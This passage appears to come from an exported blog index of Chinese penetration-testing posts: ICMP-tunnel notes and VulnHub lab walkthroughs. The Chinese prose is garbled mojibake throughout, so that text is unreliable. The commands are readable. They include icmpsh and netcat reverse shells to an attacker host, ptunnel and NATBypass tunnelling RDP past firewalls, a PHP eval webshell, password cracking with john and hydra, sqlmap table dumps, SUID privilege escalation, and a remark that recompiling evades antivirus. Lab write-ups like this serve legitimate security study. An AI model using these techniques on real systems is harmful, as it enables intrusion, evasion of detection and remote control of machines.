Âú®Êñá‰ª∂ÈáåÊèíÂÖ•ÂèçÂºπshellÔºåÁ≠â‰∏Ä‰ºöÂÑøÊàêÂäüÊèêÊùÉ„ÄÇ]]></content>
      <categories>
        <category>Èù∂Êú∫</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[ICMPÈößÈÅìÂ≠¶‰π†Á¨îËÆ∞]]></title>
    <url>%2F2020%2F06%2F25%2Ficmp_tunnel_learning_note%2F</url>
    <content type="text"><![CDATA[ÂéüÁêÜICMPÂçèËÆÆÈÄöÂ∏∏Áî®‰∫éËøîÂõûÁöÑÈîôËØØ‰ø°ÊÅØÊàñÊòØÂàÜÊûêË∑ØÁî±ÔºåpingÂíåtraceroute‰ΩøÁî®ÁöÑÂ∞±ÊòØËøô‰∏™ÂçèËÆÆ„ÄÇÈÄöÂ∏∏‰∏§Âè∞ËÆæÂ§áÈÄö‰ø°ÈúÄË¶ÅÈÄöËøáÁ´ØÂè£Ôºå‰ΩÜÂú®ICMPÂçèËÆÆ‰∏ãÂ∞±‰∏çÈúÄË¶ÅÔºå‰æùÊçÆËøô‰∏™ÁâπÁÇπÂèØÁªïËøáIDS„ÄÅIPSÁ≠âËÆæÂ§á„ÄÇ icmpshicmpshÊòØÂü∫‰∫éICMPÂçèËÆÆÔºåÂèØÂú®ÊîªÂáªËÄÖÊúçÂä°Âô®Ë∑®Âπ≥Âè∞ËøêË°åÁöÑWindowsÂèçÂºπshellÂ∑•ÂÖ∑„ÄÇ‰∏ãÈù¢ÂÖ∂ÊòØgithub‰∏äÁöÑÈ°πÁõÆÂú∞ÂùÄ„ÄÇ https://github.com/inquisb/icmpsh ‰ΩøÁî®ÊñπÊ≥ïÊääicmpshÈ°πÁõÆ‰ªégithub‰∏ä‰∏ãËΩΩ‰∏ãÊù•ÔºåÊääÂÖ∂‰∏≠ÁöÑicmpsh.exe‰∏ä‰º†Âà∞ÁõÆÊ†á‰∏ªÊú∫„ÄÇ Linux‰Ωú‰∏∫ÊîªÂáªËÄÖÊúçÂä°Âô®ÂàôÈúÄË¶ÅÂÆâË£ÖpythonÁöÑimpacketÂ∫ìÔºåÊàëÁöÑParrotÁ≥ªÁªü‰∏äÂ∑≤Â∞ÜÂÆâË£ÖÂ•Ω‰∫Ü„ÄÇ 12sudo apt install python-impacket run.shËÑöÊú¨ÈáåËé∑ÂèñÁΩëÂç°ÂíåipÂú∞ÂùÄÁöÑÊñπÊ≥ïÂú®ÊàëÁöÑÁ≥ªÁªüÈáåÊó†ÊïàÔºå‰∫éÊääËé∑ÂèñÂëΩ‰ª§Á®çÂæÆÊîπ‰∫Ü‰∏Ä‰∏ãÔºåÊàëÁöÑÁΩëÂç°ÂêçÊòØeth0„ÄÇ 12IP=$(ifconfig "eth0" |grep "inet "| awk '&#123; print $2 &#125;') Êé•ÁùÄ‰ª•ÁÆ°ÁêÜÂëòÊùÉÈôêËøêË°årun.shËÑöÊú¨ÔºåËæìÂÖ•ÁõÆÊ†á‰∏ªÊú∫ÁöÑipÂú∞ÂùÄÔºåÂ§çÂà∂ÁªôÂá∫ÁöÑÂëΩ‰ª§Âà∞ÁõÆÊ†á‰∏ªÊú∫ËøêË°å„ÄÇ ÁõÆÊ†á‰∏ªÊú∫ÊâßË°åÂëΩ‰ª§ÂêéÊàêÂäüÂèçÂºπshell„ÄÇ ÂÖ∂ÂÆûÁõ¥Êé•ËøêË°åÈ°πÁõÆ‰∏ãÁöÑicmpsh_m.pyÊïàÊûú‰πüÊòØ‰∏ÄÊ†∑ÁöÑÔºå‰∏çËøáË¶ÅÂÖàÊâãÂä®ÂÖ≥Èó≠pingÂëΩ‰ª§ÁöÑICMPÂ∫îÁ≠î„ÄÇ 1234sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1sudo python icmpsh_m.py ATTACKER_IP VICTIM_IP Êï∞ÊçÆÂåÖÂàÜÊûê‰ΩøÁî®tcpdumpÊäì‰∏ã192.168.189.129Âíå192.168.189.135‰πãÈó¥ÁöÑÊâÄÊúâÊï∞ÊçÆÂåÖ„ÄÇ 12sudo tcpdump ip host 192.168.189.129 and 192.168.189.135 -w /tmp/icmp.cap Áî®wiresharkÊâìÂºÄÂÜçÂéªÂà∞ÁöÑÊï∞ÊçÆÔºåÂèØ‰ª•ÁúãÂà∞‰∏§Âè∞‰∏ªÊú∫‰πãÈó¥ÁöÑÊï∞ÊçÆÂåÖÁöÑÂçèËÆÆÈÉΩÊòØICMP„ÄÇ ÊâæÂà∞‰∫ÜÂØπËæìÂÖ•ÂëΩ‰ª§ËØ∑Ê±ÇÂíåÂìçÂ∫îÁöÑ‰∏§‰∏™ÂåÖÔºåÂèëÁé∞‰ªñ‰ª¨ÁöÑÂÜÖÂÆπÈÉΩÊòéÊñáÂ≠òÂÇ®Âú®ICMPÊä•ÊñáÁöÑDataÁªìÊûÑÂ§Ñ„ÄÇ ÊùÄËΩØÊü•ÊùÄÊÉÖÂÜµÁî±‰∫éËÉΩÂ§üÁõ¥Êé•ÂèçÂºπshellÔºåÂú®virustotalÂá†‰πé‰∏ÄÂçäÁöÑÂéÇÂïÜÈÉΩÊä•ÊØí‰∫Ü„ÄÇ ‰ΩøÁî®Ê∫êÁ†Å‰ªéÊñ∞ÁºñËØëÁöÑ‰∏ä‰º†‰∏äÂéªËØïËØïÔºåÂè™Êúâ‰∏Ä‰∏™ÂéÇÂïÜÊä•ÊØí„ÄÇ ptunnel‰∏éicmpsh‰∏ÄÊ†∑Ôºåptunnel‰πüÊòØÂü∫‰∫éICMPÂçèËÆÆÁöÑÂ∑•ÂÖ∑Ôºå‰ΩÜptunnelÊòØ‰∏Ä‰∏™Á∫ØÁ≤πÁöÑICMPÈößÈÅìÔºåËÉΩÂÆûÁé∞Ê≠£ÂêëÈößÈÅìÁöÑÂäüËÉΩ„ÄÇÁªèÊàëÊµãËØïicmpshÈúÄË¶Å‰∏§Âè∞Êú∫Âô®ÈÉΩÊòØÂÖ¨ÁΩëÁöÑÊâçËÉΩÂèçÂºπshellÔºåptunnelÂ∞±Ê≤°Ëøô‰∏™ÈóÆÈ¢òÔºå‰ΩÜ‰ΩøÁî®Ëøô‰∏™ÈúÄË¶ÅÁÆ°ÁêÜÂëòÊùÉÈôê„ÄÇKaliÂíåParrotÂ∑≤ÊúâËøô‰∏™Â∑•ÂÖ∑Ôºå‰πüÊúâWindowsÁâàÔºåÈúÄË¶ÅËá™Â∑±ÁºñËØëÔºå‰ΩÜÊó†ËÆ∫ÊòØÊàëËá™Â∑±ÁºñËØëÁöÑÔºåËøòÊòØGitHub‰∏äÁºñËØëÂ•ΩÁöÑÈÉΩÊ≤°Ê≥ïÂú®Windows2012‰∏äËøêË°åÔºåÂÄíÊòØËÉΩÂú®Windows10‰∏äËøêË°åÔºå‰∏çÁü•ÈÅìÊòØ‰∏çÊòØÁºñËØëÁéØÂ¢ÉÁöÑÈóÆÈ¢òÔºåËøòÊòØ‰ªñWinPcapÂ∫ìÁöÑÈóÆÈ¢ò„ÄÇ https://github.com/ptunnel-win/ptunnelÔºàÈùûÂÆòÊñπÔºåË≤å‰ººÂÆòÊñπÊ≤°ÂèëÂú®GitHub‰∏äÔºâ Ëá™Â∑±ÁºñËØëË¶ÅË£ÖÂ•ΩMinGW„ÄÇ ÁºñËØëÊñπÊ≥ïÔºöÊääÈ°πÁõÆclone‰∏ãÊù•ÔºåÂÜçÊääWinPcapÂ∫ì‰∏ãËΩΩ‰∏ãÊù•ÔºåÊîæÂà∞Âêå‰∏Ä‰∏™È°πÁõÆÊñá‰ª∂Â§πÈáåÔºåÂú®‰ΩøÁî®Â¶Ç‰∏ãÂëΩ‰ª§ÁºñËØë„ÄÇ 12gcc ptunnel.c md5.c -L".\WpdPack\Lib" -I".\WpdPack\Include" -lwpcap -lwsock32 -g -Wall -DWIN32 -o ptunnel.exe ‰ΩøÁî®ÊñπÊ≥ïÂèçÂºπshellÊúçÂä°Á´ØÔºö 12sudo ptunnel ÂÆ¢Êà∑Á´ØÔºö 12ptunnel.exe -p SERVER_IP -lp 8888 -da SERVER_IP -dp 8888 ÊúçÂä°ÁöÑÂá∫Áé∞Âª∫Á´ãSessionÁöÑÂ≠óÊ†∑Êó¢ÊàêÂäüÂª∫Á´ãICMPÈößÈÅì„ÄÇ Áé∞Âú®ÊµãËØï‰∏ãÂÜçÁõÆÊ†á‰∏ªÊú∫ÂèçÂºπ‰∏™shellÔºåÂÖàÂú®ÊîªÂáªËÄÖ‰∏ªÊú∫ÁõëÂê¨ÊåáÂÆöÁ´ØÂè£ÔºåÁÑ∂ÂêéÂÜçÂú®ÁõÆÊ†á‰∏ªÊú∫Áî®ncÂèçÂºπ‰∏™shellÂà∞Êú¨Âú∞ÁõëÂê¨ÁöÑÁ´ØÂè£„ÄÇÊ≥®ÊÑèÈ°∫Â∫è‰∏çÂØπÂèØËÉΩËøûÊé•‰∏ç‰∏äÔºåÁéÑÂ≠¶ÈóÆÈ¢ò„ÄÇ 12345678server:nc -lvpclient:nc.exe 127.0.0.1 3399 -e C:\Windows\System32\cmd.exe Êò†Â∞Ñ3389Êó¢ÁÑ∂ÈÉΩÂª∫Á´ã‰∫ÜICMPÈößÈÅì‰∫ÜÔºå‰ªÖ‰ªÖÂèçÂºπ‰∏™shellËÇØÂÆöÊòØ‰∏çÂ§üÁöÑÔºå‰∏ãÈù¢Â∞±ËØïËØïÂÜÖÁΩë3389ÈÄöËøáICMPÈößÈÅìÊò†Â∞ÑÂà∞Â§ñÁΩë„ÄÇ‰ª•‰∏ãÊòØÊãìÊâëÂõæÔºö ÂÖàÂú®Attacker‰∏ªÊú∫ÂºÄÂêØptunnel„ÄÇ 12sudo ptunnel ÂÜçÂú®Server‰∏ªÊú∫ptunnel‰Ωú‰∏∫ÊúçÂä°Á´ØÂºÄÂêØÊú¨Âú∞ÁõëÂê¨Á´ØÂè£„ÄÇ 12ptunnel.exe -p 192.168.3.65 -lp 3399 -da 192.168.3.65 -dp 3399 Êé•ÁùÄÂú®Attacker‰∏ªÊú∫‰ΩøÁî®lcxÁ±ªÁöÑÂ∑•ÂÖ∑ÔºåÂºÄÂêØÁõëÂê¨Ê®°Âºè„ÄÇËøôÈáåÁöÑlcxÁ±ªÂ∑•ÂÖ∑Êàë‰ΩøÁî®ÁöÑÊòØNATBypassÔºåÁî®goÁºñÂÜôÔºåÁºñËØëÊàê‰∏çÂêåÂèØÊâßË°åÊñá‰ª∂ÂêéÂèØË∑®Âπ≥Âè∞‰ΩøÁî®„ÄÇ https://github.com/cw1997/NATBypass 12./nb -listen 3399 3389 ÊúÄÂêéÂú®Server‰∏ªÊú∫‰ΩøÁî®slaveÊ®°ÂºèÔºåËΩ¨Âèë3389Âà∞ptunnelÊú¨Âú∞ÁõëÂê¨ÁöÑÁ´ØÂè£„ÄÇ 12nb.exe -slave 127.0.0.1:3389 127.0.0.1:3399 Âá∫Áé∞accept a new clientÂ≠óÊ†∑ÔºåÊó¢ÊàêÂäüÂª∫Á´ãËøûÊé•„ÄÇ Â∞èÁªìÈÄöËøáICMPÈößÈÅìÊò†Â∞Ñ3389Â∞±ËøôÁÆÄÁÆÄÂçïÂçïÂá†Êù°ÂëΩ‰ª§Ôºå‰ΩÜÊòØÈÅáÂà∞ÂëΩ‰ª§ÊâßË°åÈ°∫Â∫èÂíåÔºå‰∏ÄÂºÄÂßã‰ΩøÁî®ÁöÑGitHub‰∏äÁî®CÂÜôÁöÑË∑®Âπ≥Âè∞lcxÔºåÂêåÁΩëÊÆµËÉΩÈÄöËøáÈößÈÅìÔºå‰∏çÂêåÁΩëÊÆµ‰∏çËÉΩÁöÑÈóÆÈ¢òÔºåÊéíÊü•Ëµ∑Êù•Ëä±‰∫Ü‰∏ÄÂ§©Ôºåwtcl„ÄÇ Êï∞ÊçÆÂåÖÂàÜÊûêÁî®wiresharkÊäì‰∏ãÂèçÂºπshellÊó∂ÁöÑÊï∞ÊçÆÂåÖ„ÄÇÊ≤°Êúâ‰ΩøÁî®ÂØÜÁ†ÅÊó∂ÔºåÊï∞ÊçÆÂåÖÂÜÖÂÆπË∑üicmpsh‰∏ÄÊ†∑ÔºåÈÉΩÊòØÊòéÊñáÂÜôÂú®ICMPÊä•ÊñáÁöÑDataÁªìÊûÑÈáåÔºå‰ΩÜÊòØDataÁªìÊûÑÈáåËøòÊúâÂá†ÂçÅÂ≠óËäÇÁöÑÂÖ∂‰ªñÂÜÖÂÆπÔºåÂèØËÉΩÊòØËÆ∞ÂΩïËΩ¨ÂèëipÂíåÁ´ØÂè£‰πãÁ±ªÁöÑÂÜÖÂÆπ„ÄÇ ‰ΩøÁî®ÂØÜÁ†ÅÊó∂ÂèçÂºπshellÁöÑÊï∞ÊçÆÂåÖÊòØ‰∏ÄÊ†∑ÁöÑÔºåÂèØËÉΩÊòØÂú®Âª∫Á´ãÈößÈÅìÊó∂ÊâçËøõË°å‰∏ÄÊ¨°ÂØÜÁ†ÅÁ°ÆËÆ§„ÄÇ ÊùÄËΩØÊü•ÊùÄÊÉÖÂÜµptunnelÂú®virustotal‰∏äÊúâ‰∫î‰∏™ÂéÇÂïÜÊä•ÊØíÔºåÂÖ∂‰∏≠‰∏Ä‰∏™ËØÜÂà´Âá∫Êù•ÊòØptunnelÔºåÊÄª‰ΩìÈóÆÈ¢ò‰∏çÂ§ß„ÄÇÔºàÊàëÊÄé‰πàËÆ∞ÂæóÊò®Â§©ÊâçÊúâ‰∏§‰∏™Êä•ÊØíÁöÑÂë¢-_-!Ôºâ ÂÖ∂‰ªñÂ∑•ÂÖ∑ÂÖ∂‰ªñÁ±ª‰ººÂ∑•ÂÖ∑ÊúâpingtunnelÔºåÁî®goÁºñÂÜôÔºåÊîØÊåÅËΩ¨Âèëtcp„ÄÅudpÂíåsock5ÔºåËÉΩÂ§üÂºÄÂπ≥Âè∞‰ΩøÁî®„ÄÇ‰∏çËøáÊàëÁî®Ëøô‰∏™ÊÉ≥Êää3389Êò†Â∞ÑÂá∫Êù•Êó∂ÔºåÈÅáÂà∞ÁÇπÈóÆÈ¢òÔºåÊ≤°Êò†Â∞ÑÊàêÂäü„ÄÇ ÂêéËÆ∞‰ª•Ââç‰∏çÁü•ÈÅìpingÂíåtracerouteÊúâÁöÑÊòØ‰ªÄ‰πàÂçèËÆÆÔºåÁé∞Âú®Áü•ÈÅì‰∫ÜÊòØ‰ªñ‰ª¨ÁâπÊúâÁöÑICMPÂçèËÆÆÔºåÈÄöËøáICMPËøò‰∫ÜËß£Âà∞Ëøô‰πàÂ§öÂ¶ôÁî®:D]]></content>
      <categories>
        <category>Ê∏óÈÄèÊµãËØï</category>
      </categories>
      <tags>
        <tag>ICMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Seppuku walkthrought]]></title>
    <url>%2F2020%2F06%2F20%2FSeppuku_walkthrough%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄËøô‰∏™Èù∂Êú∫‰ΩúËÄÖËá™ËØÑÈöæÂ∫¶IntermediateÂà∞HardÔºåÂÖ∂ÂÆû‰πü‰∏çÈöæ„ÄÇWebÊñπÈù¢ËÄÉÁöÑÊòØ‰ø°ÊÅØÊî∂ÈõÜÁöÑËÉΩÂäõÔºåÊèêÊùÉÊñπÈù¢ËÄÉÁöÑÂèØÊèêÂèñÁöÑÁÇπ‰∏≤ËÅîÂà©Áî®ÁöÑËÉΩÂäõ„ÄÇ https://www.vulnhub.com/entry/seppuku-1,484/ Âà©Áî®ËøáÁ®ãnmapÊî∂ÈõÜÁ´ØÂè£ÂºÄÂêØÁöÑ‰ø°ÊÅØÔºåÂèëÁé∞ÂºÄÂêØ‰∫Üftp„ÄÅssh„ÄÅsambaÂíåÂ•ΩÂá†‰∏™ÁöÑhttpÊúçÂä°„ÄÇ ‰π†ÊÉØÂÖàÁúãhttpÁöÑÊúçÂä°„ÄÇ80Á´ØÂè£ÁöÑhttpÊúçÂä°ÊúânginxÁöÑÂü∫Á°ÄËÆ§ËØÅÔºåÂÖàÊîæÁùÄ„ÄÇ Áî®dirbÊâ´7080„ÄÅ7601Âíå8088‰∏äÈù¢ÁöÑÊúçÂä°ÔºåÂèëÁé∞7061ÁöÑÁõÆÂΩïÈÉΩÂ≠òÂú®ÁõÆÂΩïÈÅçÂéÜÔºåÂú®keysÂíåsecretÁõÆÂΩï‰∏ãËøòÊúâ‰∫õÊúâÁî®ÁöÑ‰∏úË•ø„ÄÇ ÂàÜÂà´ÊòØsshÁöÑÁßÅÈí•Âíåpasswd„ÄÅshadowÁöÑÂ§á‰ªΩÂíå‰∏Ä‰∏™Â≠óÂÖ∏„ÄÇÂÖàÁî®Â≠óÂÖ∏Â∞ùËØïÁàÜÁ†¥‰∏ãshadowÔºåshadowÊúÄÂêé‰∏Ä‰∏™Áî®Êà∑ÁöÑrabbitÁöÑaÁî®ÁöÑÊòØ@ÔºåË∑üÂâçÈù¢ÁöÑpasswd‰∏ç‰∏ÄÊ†∑Ôºå‰∫éÊòØÊää‰ªñÊîπÂõûÊù•„ÄÇ Áî®unshadowÂêßpasswdÂíåshadowËΩ¨‰∏∫johnÂèØ‰ª•ËØÜÂà´ÁöÑÊ†ºÂºèÔºåÂπ∂Áî®johnÊåâ‰ø°ÊÅØÊî∂ÈõÜÂà∞ÁöÑÂØÜÁ†ÅÂ≠óÂÖ∏ËøõË°åÁàÜÁ†¥„ÄÇ 12unshadow passwd.bak shadow.bak &gt; passwd.johnjohn -w=password.lst passwd.john sshÊ≤°ÊàêÂäüËøû‰∏äÔºå‰º∞ËÆ°Â∞±ÊòØ‰ΩúËÄÖÊåñÁöÑ‰∏Ä‰∏™Âùë„ÄÇÊé•ÁùÄÂèàÁî®hydraÁàÜÁ†¥Áî®Êà∑seppukuÁöÑÂè£‰ª§ÔºåÁî®‰ø°ÊÅØÊî∂ÈõÜÁöÑÂØÜÁ†ÅÂ≠óÂÖ∏ÊàêÂäüÁàÜÁ†¥Âá∫Êù•„ÄÇ ‰æùÊóßÁî®privilege-escalation-awesome-scripts-suite‰ø°ÊÅØÊî∂ÈõÜÔºåÁúãÂà∞sudo -lÈ°πÊúâ‰∏™ËΩØËøûÊé•rootÂà∞tmpÁöÑÂëΩ‰ª§ÔºåÂ∑≤Â≠òÂú®tmpÁõÆÂΩïÔºåÂ•ΩÂÉèÊ≤°‰ªÄ‰πàÁî®„ÄÇ ‰ΩÜÂú®homeÁõÆÂΩï‰∏ãÂèëÁé∞‰∫Ü‰∏™Â±û‰∫érootÁöÑÊñá‰ª∂.passwdÔºåÊñá‰ª∂ÂêçÂíåÂÜÖÂÆπÁúãËµ∑Êù•ÂÉèÂØÜÁ†Å„ÄÇ ËØï‰∫Ü‰∏ãËÉΩÁôªÂΩïÂà∞samuraiÔºåÂÜç‰∏ÄÊ¨°Êî∂ÈõÜ‰ø°ÊÅØÔºåsudo -lÂèàÊúâÊñ∞ÁöÑ‰∏úË•ø„ÄÇ ‰ΩÜÊòØtantoÁöÑhomeÁõÆÂΩï‰∏ãÊ≤°Êúâ.cgi_binÁõÆÂΩïÔºåÊõ¥Ê≤°ÊúâbinÂèØÊâßË°åÊñá‰ª∂„ÄÇ‰∏çËøáÂú®‰ªñÁöÑ.sshÁõÆÂΩï‰∏ãÂèëÁé∞‰∫Ü‰∏™sshÂÖ¨Èí•ÔºåÈ©¨‰∏äÊÉ≥Âà∞‰∫Ü‰πãÂâçweb‰ø°ÊÅØÊî∂ÈõÜÂà∞ÁöÑsshÁßÅÈí•ÔºåsshÊàêÂäüËøû‰∏ä„ÄÇ Âà∞homeÂª∫‰∏™.cgi_binÁõÆÂΩïÔºåÂπ∂ËæìÂÖ•/bin/bash„ÄÇ ÂàáÂõûseppukuÁî®Êà∑ÔºåsudoÈÇ£Êù°ÂëΩ‰ª§ÔºåÊàêÂäüÊèêÂèñ„ÄÇ]]></content>
      <categories>
        <category>Èù∂Êú∫</category>
      </categories>
      <tags>
        <tag>NOPASSWD</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tre1 walkthrought]]></title>
    <url>%2F2020%2F06%2F20%2FTre1_walkthrough%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄËøô‰∏™Èù∂Êú∫WebÈÉ®ÂàÜËÆæËÆ°ÂæóÈùûÂ∏∏realÔºåÊèêÊùÉÈÉ®ÂàÜÂá†Ê≠•Ëµ∞ÂÆûÁé∞ÊèêÊùÉÔºå‰∏ªË¶ÅËÄÉÁöÑ‰ø°ÊÅØÊî∂ÈõÜ„ÄÇÊÄª‰ΩìÊù•ËØ¥‰∏çÈîôÂæó‰∏Ä‰∏™Èù∂Êú∫„ÄÇ https://www.vulnhub.com/entry/tre-1,483/ Âà©Áî®ËøáÁ®ãnmapÂºÄÊâ´ÔºåÂèëÁé∞ÂºÄ‰∫ÜsshÂíå80„ÄÅ8082‰∏§‰∏™Á´ØÂè£ÂæóhttpÊúçÂä°„ÄÇ 80Âíå8082Á´ØÂè£ÂêåÊó∂Áî®dirbÂºÄÊâ´ÁõÆÂΩï„ÄÇ8082Á´ØÂè£Èô§‰∫Üindex.htmlÔºåÂπ∂Ê≤°ÊúâÂèëÁé∞‰ªÄ‰πà„ÄÇ 80Á´ØÂè£‰∏ãÂç¥Êúâ‰∏çÂ∞ë‰∏úË•øÔºåÊ†πË∑ØÂæÑ‰∏ãÊï∞ÊçÆÂ∫ìËøûÊé•ÊµãËØïÁöÑÈ°µÈù¢ÂíåphpinfoÈ°µÈù¢„ÄÇ 1dirb http://192.168.189.137/ /usr/share/wordlists/dirb/big.txt -x /usr/share/wordlists/dirb/extensions_common.txt mantisbtÁõÆÂΩï‰∏ãËøòÊúâ‰∏™ÊºèÊ¥ûÊä•ÂëäÁöÑÁ≥ªÁªü„ÄÇ adminer.phpÈ°µÈù¢Â∞ùËØïÂº±Âè£‰ª§ÂíåMysqlÂÆ¢Êà∑Á´ØÊñá‰ª∂ËØªÂèñÊó†Êûú„ÄÇ ÁªßÁª≠ÂêéÈù¢ÁöÑmantisbtÁõÆÂΩïÔºåÂèëÁé∞mantisbtÁöÑÂ≠êÁõÆÂΩïÂü∫Êú¨ÈÉΩËÉΩÁõÆÂΩïÈÅçÂéÜÔºåÂú®configÁõÆÂΩï‰∏ãÊâæÂà∞‰∫Ü‰∏§‰∏™ÊúâÁî®ÁöÑÊñá‰ª∂Ôºöa.txtÂíådata.sqlÔºåÂ∫îËØ•ÊòØ‰ΩúËÄÖÁïô‰∏ã‰∫ÜÁöÑÁ∫øÁ¥¢„ÄÇ a.txtÈáåËÆ∞ÂΩïÁùÄÊï∞ÊçÆÂ∫ìÂØÜÁ†ÅÔºåÂàöÂ•ΩÂú®adminerËÉΩÊ¥æ‰∏äÁî®Âú∫„ÄÇ data.sqlÊñá‰ª∂ÈáåÈÉΩÊòØÂàõÂª∫Êï∞ÊçÆÂ∫ìÁöÑSQLËØ≠Âè•Ôºå‰ΩÜÈáåÈù¢ÊúâÊù°ÊèíÂÖ•Âà∞mantis_user_tableË°®ÁöÑÊìç‰ΩúÂ∞±ÊòéÊòæ‰∏çÂØªÂ∏∏„ÄÇpasswordÂ≠óÊÆµÁöÑMD5ÊãøÂéªcmd5ÂåπÈÖçÂæóÂá∫‰∏∫root Áî®a.txtÈáåËé∑ÂèñÂà∞ÁöÑÊï∞ÊçÆÂ∫ìÂØÜÁ†ÅÊàêÂäüÁôªÂΩïËøõ‰∫ÜadminerÔºåÈ¶ñÂÖàÊÉ≥Âà∞ÁöÑÊòØinto outfileÂÜôwebshellÔºåÁÑ∂ËÄåÊ≤°ÊùÉÈôê„ÄÇ 1select &apos;&lt;?php eval($_GET[cmd]);?&gt;&apos; into outfile &apos;/var/www/html/shell.php&apos;; Â∞ÜpasswordÂ≠óÊÆµÁöÑMD5ÊõøÊç¢‰∏∫rootÁöÑMD5ÔºåÁôªÂΩïËøõÊºèÊ¥ûÊä•ÂëäÁ≥ªÁªü„ÄÇ ÁúãËßÅÊòØÊØîËæÉÊñ∞ÁöÑÁâàÊú¨ÔºåÊØïÁ´üÊòØÊºèÊ¥ûÊä•ÂëäÁ≥ªÁªüÔºå‰º∞ËÆ°‰πüÊ≤°‰ªÄ‰πàÊºèÊ¥û„ÄÇ ËøôÊó∂ÁïôÊÑèÂà∞Áî®Êà∑Ë°®treÁöÑrealname‰∏çÂêåÂØªÂ∏∏ÔºåÁúãËÄÖÊúâÁÇπÂÉèÂØÜÁ†Å„ÄÇËØï‰∏ãsshÁôªÂΩïÔºåÊûúÁÑ∂Â∞±ËøõÂéª‰∫Ü„ÄÇ ‰∏ä‰º†privilege-escalation-awesome-scripts-suiteÁöÑËÑöÊú¨Êî∂ÈõÜ‰ø°ÊÅØÔºåÊ≥®ÊÑèÂà∞/usr/bin/ÁõÆÂΩï‰∏ãÁöÑcheck-systemÂèØÊâßË°åÊñá‰ª∂ÂèØÂÜôÔºåÂπ∂‰∏îrootÁî®Êà∑Âú®ËøêË°åËøô‰∏™ÂëΩ‰ª§„ÄÇÂëΩ‰ª§ÂÜÖÂÆπÂ¶Ç‰∏ãÔºåÊ≠ªÂæ™ÁéØecho„ÄÇ„ÄÇ„ÄÇ 12345678DATE=`date '+%Y-%m-%d %H:%M:%S'`echo "Service started at $&#123;DATE&#125;" | systemd-cat -p infowhile :doecho "Checking...";sleep 1;done ‰∏ÄÂºÄÂßã‰ª•‰∏∫ÊòØÂú®ÂÆöÊó∂‰ªªÂä°ÈáåÁî®Âà∞Ëøô‰∏™ÂëΩ‰ª§ÔºåÁÑ∂ËÄåÂπ∂Ê≤°ÊúâÔºå‰ªîÁªÜÊâæ‰∫ÜÊâæÂèëÁé∞Âú®/etc/systemd/system/ÈáåÊ≥®ÂÜåÊàê‰∫ÜÊúçÂä°„ÄÇ Ëøô‰∏™ÁõÆÂΩï‰∏ãÁöÑÊúçÂä°‰ºöÂºÄÊú∫ÂêØÂä®Ôºåsudo -lÂàöÂ•ΩÁúãËßÅshutdownÂëΩ‰ª§ËÉΩÂÖçÂØÜÁ†Åsudo„ÄÇ ÂºÄÂßãÊÉ≥ÊòØÂèçÂºπshellÔºåÁªìÊûúÊ≤°ÊàêÂäüÔºå‰∫éÊòØÁî®ÁªôfindÂëΩ‰ª§ËµãSUIDÂ±ûÊÄßÁöÑÊñπÊèêÊùÉ„ÄÇ 1chmod u+s /usr/bin/find Áî®manÁúã‰∫Ü‰∏ãshutdownÁöÑ‰ΩøÁî®ÊñπÊ≥ïÔºå-rÂèÇÊï∞ËÉΩÂ§üÈáçÂêØÈù∂Êú∫Ôºå‰∫éÊòØ‰πé‚Ä¶ 1sudo /sbin/shutdown -r 0 ÂæÖÈáçÂêØÂÆåÈáçÊñ∞Ëøû‰∏ässhÂêéÔºåfindÊèêÊùÉËÄÅÊìç‰Ωú„ÄÇ 1find . -exec /bin/bash -p \;]]></content>
      <categories>
        <category>Èù∂Êú∫</category>
      </categories>
      <tags>
        <tag>SUID</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Katana walkthrought]]></title>
    <url>%2F2020%2F06%2F19%2FKatana_walkthough%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄÊ≠¶Â£´ÂàÄËøôÈ¢ò‰ΩúËÄÖËá™ËØÑ‰∏∫‰∏≠Á∫ßÈöæÂ∫¶„ÄÇÁ°ÆÂÆûÔºåWebÊñπÈù¢ÂÅöÁùÄÊúâÁÇπËø∑ÔºåÊèêÊùÉÊñπÈù¢ÂèàÂ≠¶Âà∞‰∫Ü‰∏™Â∞ètrick„ÄÇ https://www.vulnhub.com/entry/katana-1,482/ Âà©Áî®ËøáÁ®ãÁÖßÊ†∑nmapÂÖ®Á´ØÂè£Êâ´ÊèèÔºåÂºÄ‰∫Üftp„ÄÅssh„ÄÅsambaÂíåhttpÊúçÂä°„ÄÇ 1nmap -sV -p- -T 4 192.168.189.135 ÂÖàÂéªÁúãÁúã80Á´ØÂè£ÁöÑhttpÊúçÂä°ÔºådirbÊâ´Âà∞‰∫Ü‰∏™ebookÁõÆÂΩïÔºåÂèëÁé∞Âà∞Â§ÑÈÉΩÊòØÊ≥®ÂÖ•„ÄÇ Ê≤°wafÁõ¥Êé•‰∏äÂ§ßÊùÄÂô®sqlmapÔºåÈô§‰∫Üinformation_schemaÔºåËøòÊúâ‰∏™ebookÂ∫ìÔºåÈáåÈù¢Êúâ‰∏™adminË°®ÔºåËÆ∞ÁùÄÁÆ°ÁêÜÂëòÂØÜÁ†ÅÔºåÂÖ∂‰ªñÊ≤°‰ªÄ‰πà‰∏úË•ø„ÄÇ 12sqlmap -u http://192.168.189.135/ebook/book.php?bookisbn=978-1-484217-26-9 --batch -D ebook --tablessqlmap -u http://192.168.189.135/ebook/book.php?bookisbn=978-1-484217-26-9 --batch -D ebook -T admin --dump ÈùûDBAÁî®Êà∑ÔºåsqlmapÁõ¥Êé•ÁàÜÁ†¥Âá∫Êù•ÁÆ°ÁêÜÂëòÂØÜÁ†Å„ÄÇ ËøõÂà∞ÂêéÂè∞ÂèàÊ∑ªÂä†‰π¶Êú¨ÂäüËÉΩÔºåËÉΩ‰∏ä‰º†ÂõæÁâáÔºå‰ΩÜÂÆûÊµã‰∏çÁÆ°ÊòØwebshellËøòÊòØÊ≠£Â∏∏ÂõæÁâáÔºåÈÉΩÊ≤°ËÉΩÊàêÂäü‰∏ä‰º†„ÄÇ 